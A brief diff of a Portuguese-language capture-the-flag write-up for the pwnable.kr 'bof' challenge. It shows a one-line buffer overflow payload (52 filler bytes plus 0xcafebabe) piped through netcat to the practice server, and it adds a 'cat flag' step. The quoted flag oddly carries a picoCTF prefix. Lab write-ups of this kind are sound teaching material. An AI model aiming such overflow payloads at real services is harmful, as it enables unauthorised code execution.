@@ -61,5 +61,7 @@ usando o `gdb bof`
 
 ```(python -c "print '\x41'*52 + '\xbe\xba\xfe\xca'"; cat) | nc pwnable.kr 9000```
 
+cat flag
+
 > Assim, obtemos a flag `picoCTF{daddy, I just pwned a buFFer :)}`  
 
